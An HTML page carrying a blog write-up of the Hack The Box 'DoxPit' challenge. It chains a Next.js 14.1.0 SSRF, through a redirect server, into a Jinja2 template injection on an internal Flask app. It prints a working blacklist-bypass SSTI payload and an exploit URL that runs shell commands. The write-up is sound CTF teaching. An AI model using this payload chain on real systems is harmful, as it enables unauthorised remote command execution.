<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Hi, I&#39;m Khaled, a cybersecurity engineer passionate about offensive security, software development, and DevSecOps. I specialize in penetration testing, bug bounty hunting, vulnerability research, and security automation. Through my blog, I share practical security knowledge, CTF writeups, tool development insights, and challenge walkthroughs to help the cybersecurity community learn and grow. When I&#39;m not breaking things, I&#39;m building security tools in Rust and Python, contributing to open source projects, and mentoring aspiring security professionals.">
    <meta name="keywords" content="cybersecurity, penetration testing, bug bounty, security research, vulnerability assessment, ethical hacking, security automation, CTF competitions, offensive security, mindpatch">
    <meta name="author" content="Khaled Nassar">

    <title>Solving DoxPit Challenge - @MindPatch</title>

    <link rel="stylesheet" href="/css/style.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.css">

    

    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">

    
    <script type="module">
        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';

        mermaid.initialize({
            startOnLoad: false,
            theme: 'dark',
            themeVariables: {
                darkMode: true,
                background: '#1a1a1a',
                primaryColor: '#3a3a3a',
                primaryTextColor: '#e0e0e0',
                primaryBorderColor: '#666',
                lineColor: '#999',
                secondaryColor: '#4a4a4a',
                tertiaryColor: '#2a2a2a',
                fontSize: '16px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
                nodeBorder: '#666',
                clusterBkg: '#2a2a2a',
                clusterBorder: '#555',
                edgeLabelBackground: 'rgba(0, 0, 0, 0.8)',
                textColor: '#e0e0e0'
            },
            flowchart: {
                nodeSpacing: 100,
                rankSpacing: 100,
                padding: 20,
                useMaxWidth: true
            }
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            
            document.querySelectorAll('pre code, pre.mermaid').forEach((element) => {
                const code = element.textContent.trim();

                
                const isMermaid = code.match(/^(graph|flowchart|sequenceDiagram|classDiagram|stateDiagram|erDiagram|journey|gantt|pie|gitGraph|mindmap|timeline|quadrantChart|requirementDiagram|C4Context)/);

                if (isMermaid || element.classList.contains('language-mermaid') || element.getAttribute('data-lang') === 'mermaid') {
                    const pre = element.tagName === 'PRE' ? element : element.parentElement;

                    
                    const div = document.createElement('div');
                    div.className = 'mermaid';
                    div.textContent = code;

                    
                    if (pre.parentElement) {
                        pre.parentElement.replaceChild(div, pre);
                    }
                }
            });

            
            mermaid.run();
        });
    </script>
</head>
<body>
    <header>
    <a href="/" class="site-logo">
        <img src="/logo.jpg" alt="MindPatch Logo">
    </a>
    <nav>
        
        <a href="/about">about</a>
        
        <a href="/posts">blog</a>
        
        <a href="/projects/">projects</a>
        
        <a href="/index.xml">rss</a>
    </nav>
</header>


    <main>
        
<div class="post-layout">
    <article class="post-article">
        <div class="post-header">
            <h1>Solving DoxPit Challenge</h1>
            <div class="post-meta">
                <span class="post-date">2024-08-05</span>
                
                <span class="post-tags">
                    
                    <a href="/tags/htb" data-tippy-content="View all posts tagged with HTB">#HTB</a>
                    
                    <a href="/tags/ctf" data-tippy-content="View all posts tagged with CTF">#CTF</a>
                    
                    <a href="/tags/flask" data-tippy-content="View all posts tagged with Flask">#Flask</a>
                    
                    <a href="/tags/nextjs" data-tippy-content="View all posts tagged with NextJS">#NextJS</a>
                    
                    <a href="/tags/web-security" data-tippy-content="View all posts tagged with Web Security">#Web Security</a>
                    
                </span>
                
            </div>
        </div>

        <div class="post-content">
            <h1 id="htb-solving-doxpit-challange">[HTB] Solving DoxPit Challange</h1>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png" alt=""></p>
<p>In this write-up, I‚Äôll walk you through the process of solving the HTB DoxPit challenge</p>
<p>This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, I‚Äôll show you how to exploit these vulnerabilities and successfully capture the flag</p>
<p>Let‚Äôs dive into the details!</p>
<h1 id="getting-started">Getting Started</h1>
<p>The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.</p>
<p>The Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of  <code>render_template_string</code></p>
<pre><code class="language-python"># app.py
@web.route(&quot;/home&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])  
@auth_middleware  
def feed():  
  directory = request.args.get(&quot;directory&quot;)  
    
  if not directory:  
    dirs = os.listdir(os.getcwd())  
    return render_template(&quot;index.html&quot;, title=&quot;home&quot;, dirs=dirs)  
  
  if any(char in directory for char in invalid_chars):  
    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=&quot;invalid directory&quot;), 400  
  
  try:  
    with open(&quot;./application/templates/scan.html&quot;, &quot;r&quot;) as file:  
        template_content = file.read()  
        results = scan_directory(directory)  
        template_content = template_content.replace(&quot;{{ results.date }}&quot;, results[&quot;date&quot;])  
        template_content = template_content.replace(&quot;{{ results.scanned_directory }}&quot;, results[&quot;scanned_directory&quot;])  
        return render_template_string(template_content, results=results)  
          
  except Exception as e:  
    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=e), 500
</code></pre>
<p>However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)</p>
<h1 id="identifying-the-ssrf-vulnerability">Identifying the SSRF Vulnerability</h1>
<p>I took a look at the  <code>package.json</code>  file of the NextJS app and saw that it was using version  <code>14.1.0</code></p>
<p><img src="https://miro.medium.com/v2/resize:fit:681/1*dleheh-C-qvDofbc6PZIRA.png" alt=""></p>
<p>This version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the  <code>redirect</code>  function from  <code>next/navigation</code></p>
<p>Specifically, I found that the  <code>doRedirect</code>  function in  <code>serverAction.tsx</code>, which was used in the home page posts links, utilized this function</p>
<pre><code class="language-js">&quot;use server&quot;;  
  
import { redirect } from &quot;next/navigation&quot;;  
  
export async function doRedirect() {  
  redirect(&quot;/error&quot;);  
}
</code></pre>
<pre><code class="language-html">&lt;form action={doRedirect}&gt;  
      &lt;button className=&quot;link-light&quot; type=&quot;submit&quot;&gt;{paste.title}&lt;/button&gt;  
&lt;/form&gt;
</code></pre>
<h1 id="exploiting-ssrf">Exploiting SSRF</h1>
<p>To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the  <code>Host</code>  and  <code>Origin</code>  headers to point to my server</p>
<p>Before diving into this, I added Burp Collaborator to test if I would receive any requests from the application</p>
<p>This step was crucial to confirm that the application was interacting with my server as expected</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*OIhA8_i0n-duq8g0sNJEVA.png" alt=""></p>
<p>And yep got it üéâ</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*vAubxr_uxPh000PCWOZjpg.png" alt=""></p>
<p>I then configured Burp Suite to respond with a 302 redirect to  <code>0.0.0.0:3000</code></p>
<p>To test this, I set up a simple Flask application to serve as a local endpoint</p>
<pre><code class="language-python">
# got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io  
  
from flask import Flask, Response, request, redirect  
app = Flask(__name__)  
  
@app.route('/', defaults={'path': ''})  
@app.route('/&lt;path:path&gt;')  
def catch(path):  
    if request.method == 'HEAD':  
        resp = Response(&quot;&quot;)  
        resp.headers['Content-Type'] = 'text/x-component'  
        return resp  
    return redirect('http://0.0.0.0:3000')
</code></pre>
<h1 id="accessing-the-internal-app">Accessing the Internal App</h1>
<p>After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*SuGoOgMNjUgZC0tKqx-joA.png" alt=""></p>
<p>The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions</p>
<p>The registration endpoint allowed us to create an account using a simple GET request</p>
<pre><code class="language-python">
@web.route(&quot;/register&quot;, methods=[&quot;GET&quot;])  
def register():  
  username = request.args.get(&quot;username&quot;)  
  password = request.args.get(&quot;password&quot;)  
  
  if not username or not password:  
    return render_template(&quot;register.html&quot;, title=&quot;register&quot;)  
  
  db_session = Database()  
  token = generate(16)  
  user_valid = db_session.create_user(username, password, token)  
    
  if not user_valid:  
    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=&quot;user exists&quot;), 401  
  
  return render_template(&quot;error.html&quot;, title=&quot;success&quot;, error=f&quot;User created with token: {token}&quot;), 200
</code></pre>
<p>So I changed my server to point to  <code>[http://0.0.0.0:3000/register?username=kebda&amp;password=3afroto](http://0.0.0.0:3000/register?username=kebda&amp;password=3afroto)</code></p>
<p>With the account successfully created, the application returned a session token</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*RcpX5mpj9R-BJDQ5JzBZ3A.png" alt=""></p>
<p>Using this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate:  <code>http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530</code></p>
<pre><code class="language-python">
# auth handling function  
def auth_middleware(func):  
  def check_user(*args, **kwargs):  
    db_session = Database()  
  
    if not session.get(&quot;loggedin&quot;):  
      if request.args.get(&quot;token&quot;) and db_session.check_token(request.args.get(&quot;token&quot;)):  
        return func(*args, **kwargs)  
      else:  
        return redirect(&quot;/login&quot;)  
  
    return func(*args, **kwargs)  
  
  check_user.__name__ = func.__name__  
  return check_user
</code></pre>
<p>This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*4f-kqARPFX3WrKrr-8s5Sw.png" alt=""></p>
<p>let‚Äôs jump into  <code>directory</code>  parameter to get this SSTI!</p>
<p>I initially tried common payloads like  <code>{{1*8}}</code>, but these were blocked due to a blacklist filtering out certain characters:(</p>
<pre><code class="language-python">invalid_chars = [&quot;{{&quot;, &quot;}}&quot;, &quot;.&quot;, &quot;_&quot;, &quot;[&quot;, &quot;]&quot;,&quot;\\&quot;, &quot;x&quot;]
 
  if any(char in directory for char in invalid_chars):  
    return render_template(&quot;error.html&quot;, title=&quot;error&quot;, error=&quot;invalid directory&quot;), 400
</code></pre>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*700MrKoEPGKbv9MKkYGzKg.png" alt=""></p>
<h1 id="bypassing-the-blacklist">Bypassing the Blacklist</h1>
<p>To bypass this filter, I searched for alternative approaches and found a method in this  <a href="https://0day.work/jinja2-template-injection-filter-bypasses/">article</a></p>
<p>The idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter</p>
<pre><code>
+---------------------------+  
|       Main Input          |  
|  (Filtered by blacklist)  |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|       Alternative         |  
|        Input Parameter     |  
|    (Not filtered)         |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|   Payload Injection       |  
|   (Bypassing the filter)  |  
+---------------------------+  
            |  
            v  
+---------------------------+  
|       Final Output        |  
|  (Executed Command Result)|  
+---------------------------+
</code></pre>
<p>And that‚Äôs the payload I came with</p>
<pre><code class="language-html">&amp;#123;%with output=((((request|attr('application'))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;globals&amp;#39;)))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;getitem&amp;#39;)))(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;builtins&amp;#39;))|attr(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;getitem&amp;#39;)))(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;import&amp;#39;)))(&amp;#39;os&amp;#39;)|attr(&amp;#39;popen&amp;#39;)(request|attr(&amp;quot;args&amp;quot;)|attr(&amp;quot;get&amp;quot;)(&amp;#39;cmd&amp;#39;))|attr(&amp;#39;read&amp;#39;)()%&amp;#125;&amp;#123;%print(output)%&amp;#125;&amp;#123;%endwith%&amp;#125;&amp;globals=__globals__&amp;getitem=__getitem__&amp;builtins=__builtins__&amp;import=__import__&amp;cmd=

</code></pre>
<p>To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters</p>
<p><code>invalid_chars = [&quot;{{&quot;, &quot;}}&quot;, &quot;.&quot;, &quot;_&quot;, &quot;[&quot;, &quot;]&quot;,&quot;\\&quot;, &quot;x&quot;]</code></p>
<p>I replaced blacklisted characters and patterns with alternatives:</p>
<ul>
<li><code>**{{**</code>  was replaced with  <code>**{%**</code>.</li>
<li><code>**}}**</code>  was replaced with  <code>**%}**</code>.</li>
<li><code>**.**</code>  was bypassed by using attribute chaining through the  <code>request</code>  object.</li>
<li><code>**_**</code>  was avoided by using alternative attribute names and methods.</li>
<li><code>**[**</code> <strong>and</strong> <code>**]**</code>  were substituted with attribute access via  <code>attr()</code>.</li>
<li><code>**\\**</code>  and  <code>**x**</code>  were sidestepped by constructing the payload in a way that didn&rsquo;t require these characters.</li>
</ul>
<p>I navigated through the  <code>request</code>  attributes to access Python‚Äôs  <code>globals</code>  and  <code>builtins</code>  dictionaries, using the  <code>import</code>  function, I imported the  <code>os</code>  module and used its  <code>popen</code>  method to OS execute commands</p>
<p>‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî -</p>
<p>And Successfully executed the  <code>id</code>  command, confirming root access</p>
<pre><code class="language-http">http://0.0.0.0:3000/home?token=&lt;&gt;&amp;directory=&amp;#123;%with output=((((request|attr('application'))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('globals')))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('getitem')))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('builtins'))|attr(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('getitem')))(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('import'))('os')|attr('popen')(request|attr(&quot;args&quot;)|attr(&quot;get&quot;)('cmd'))|attr('read')()%&amp;#125;&amp;#123;%print(output)%&amp;#125;&amp;#123;%endwith%&amp;#125;&amp;globals=__globals__&amp;getitem=__getitem__&amp;builtins=__builtins__&amp;import=__import__&amp;cmd=id

</code></pre>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*Xl5B59r9fgJGMBkPuPNcLg.png" alt=""></p>
<p>Nice, Root:)</p>
<p>Ran  <code>ls -lah /</code>  to list the system files, which revealed the flag&rsquo;s location</p>
<p><img src="https://miro.medium.com/v2/resize:fit:695/1*0Kw-zjh-CPKYvW8O7ym5kQ.png" alt=""></p>
<p>nice flag is there, lets use  <code>cat</code>to read the flag from the file, successfully retrieving it</p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*TCdBFtrQgv36-ftOkivS8g.png" alt=""></p>
<p><img src="https://miro.medium.com/v2/resize:fit:700/1*A3zR-rBM2mstqTg5zxvU8w.png" alt=""></p>
<p>And That‚Äôs it</p>
<p>Bye UwU</p>

        </div>
    </article>

    
    
    <aside class="toc-sidebar">
        <div class="toc">
            <div class="toc-title">Table of Contents</div>
        </div>
    </aside>
    
</div>

<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;">
    <a href="/posts">‚Üê Back to posts</a>
</div>

    </main>

    <footer>
    <p>&copy; 2026 Khaled Nassar</p>
</footer>


    
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.js"></script>

    
    <script src="https://unpkg.com/@popperjs/core@2"></script>
    <script src="https://unpkg.com/tippy.js@6"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.js"></script>

    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            Prism.highlightAll();

            
            mediumZoom('article img, .post-content img', {
                margin: 24,
                background: 'rgba(0, 0, 0, 0.9)',
                scrollOffset: 0
            });

            
            renderMathInElement(document.body, {
                delimiters: [
                    {left: '$$', right: '$$', display: true},
                    {left: '$', right: '$', display: false},
                    {left: '\\(', right: '\\)', display: false},
                    {left: '\\[', right: '\\]', display: true}
                ],
                throwOnError: false
            });

            
            if (document.querySelector('.toc')) {
                tocbot.init({
                    tocSelector: '.toc',
                    contentSelector: '.post-content',
                    headingSelector: 'h2, h3, h4',
                    hasInnerContainers: true,
                    collapseDepth: 6,
                    scrollSmooth: true,
                    scrollSmoothDuration: 420,
                    headingsOffset: 40,
                    scrollSmoothOffset: -40,
                    positionFixedSelector: '.toc',
                    fixedSidebarOffset: 'auto',
                    throttleTimeout: 50,
                    includeHtml: false,
                    onClick: function(e) {
                        e.preventDefault();
                        const targetId = e.target.getAttribute('href');
                        const targetElement = document.querySelector(targetId);
                        if (targetElement) {
                            targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }
                });
            }

            
            tippy('[data-tippy-content]', {
                theme: 'custom',
                placement: 'top',
                arrow: true,
                animation: 'scale'
            });

            
            document.querySelectorAll('pre[class*="language-"]').forEach(function(pre) {
                pre.classList.add('line-numbers');
            });
        });
    </script>
</body>
</html>
